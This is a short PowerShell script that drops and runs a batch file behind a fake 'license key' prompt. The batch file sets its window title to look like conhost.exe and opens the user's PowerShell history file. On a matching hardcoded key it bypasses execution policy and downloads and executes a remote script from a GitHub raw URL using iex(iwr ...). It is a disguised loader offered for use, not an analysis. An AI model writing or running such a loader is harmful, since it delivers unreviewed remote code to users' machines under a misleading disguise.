$path = "$env:TEMP\run.bat"

@"
@echo off
mode con: cols=60 lines=20
title C:\Windows\System32\conhost.exe
color 0A
cls

set hist=%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
if not exist "%hist%" type nul > "%hist%"
start notepad "%hist%"

:input
echo.
set /p key=Enter license key: 
set key=%key: =%

if "%key%"=="Nel" goto ok
if "%key%"=="King" goto ok

if "%key%"=="finalpremium-27BHJ" goto ok
if "%key%"=="finalpremium-8K2LM" goto ok
if "%key%"=="finalpremium-X91QP" goto ok
if "%key%"=="finalpremium-55TGH" goto ok
if "%key%"=="finalpremium-AB12Z" goto ok
if "%key%"=="finalpremium-9PLK3" goto ok
if "%key%"=="finalpremium-QW77E" goto ok
if "%key%"=="finalpremium-ZX90N" goto ok
if "%key%"=="finalpremium-MN45R" goto ok
if "%key%"=="finalpremium-LL22X" goto ok

echo Invalid key
goto input

:ok
powershell -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/lnwmon2-crypto/private/main/main.ps1')"
echo.
echo Successfully
pause
"@ | Out-File -Encoding ASCII $path

cmd.exe /c start cmd /k "$path"
exit
